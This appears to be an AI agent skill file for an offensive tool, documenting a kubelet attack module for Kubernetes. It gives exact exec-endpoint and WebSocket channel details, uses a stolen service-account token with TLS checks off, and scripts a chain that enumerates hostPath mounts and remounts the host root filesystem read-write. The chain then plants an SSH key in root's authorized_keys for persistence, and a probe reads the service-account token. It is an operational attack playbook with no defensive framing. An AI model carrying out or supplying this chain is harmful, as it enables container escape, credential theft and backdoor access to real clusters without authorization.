---
name: kube
description: Kubelet attack module — WebSocket exec with empirical defaults (v4.channel.k8s.io, v5 fallback, repeatable command, output=1&input=1, channel framing), the canned pod→mount→remount→SSH-key chain, and the exec-contract probe. Usage: /kube exec|chain|probe
---

# /kube

The kubelet speaks a precise protocol; guessing it wastes hours. Every
default here is the empirically-verified contract:

- **exec URL**: `/exec/{ns}/{pod}/{container}?command=…&command=…&output=1&input=1&error=1`
  — `command` is repeatable (one param per argv element), `input=1` opens
  the stdin channel.
- **subprotocols**: `v4.channel.k8s.io` first, `v5.channel.k8s.io` fallback.
- **channel framing**: every ws message starts with a channel byte —
  `0x00` stdin, `0x01` stdout, `0x02` stderr, `0x03` error (JSON
  streamstatus). Closing stdin = an empty channel-0 message.
- **auth**: `Authorization: Bearer <SA-token>`; kubelet certs are
  self-signed (unverified TLS).

## Subcommands

```
/shardreaper kube exec  --host 10.0.0.9 --token <sa> --pod p1 cmd args...
/shardreaper kube chain --host 10.0.0.9 --token <sa> --pod p1 --pubkey key.pub
/shardreaper kube probe --host 10.0.0.9 --token <sa> --pod p1
```

## The canned chain (enforced discipline)

1. pod list → hostPath mount enum
2. NSpid/userns proof BEFORE trusting pod side effects
3. `mount -o remount,rw /host/root` — prints NOTHING on success, so
   `/proc/mounts` is grepped for the `rw` flag before anything is claimed
4. SSH-key persistence into `<mount>/root/.ssh/authorized_keys` — the write
   is only claimed after grep returns the key fingerprint

## The exec-contract probe (fixed order)

1. **side-effect probe FIRST**: write a marker to /tmp and read it back —
   the exec contract is unproven until that round-trips
2. entrypoint names second: /bin/sh, /bin/bash, /bin/ash, busybox, zsh, dash
3. once any shell exists: **read the source** (/proc/self/mountinfo, cgroup,
   SA token, cmdline) instead of black-box guessing

Every payload crosses the boundary as inline literals, marker-wrapped and
verify-flagged (`payload.py` discipline).
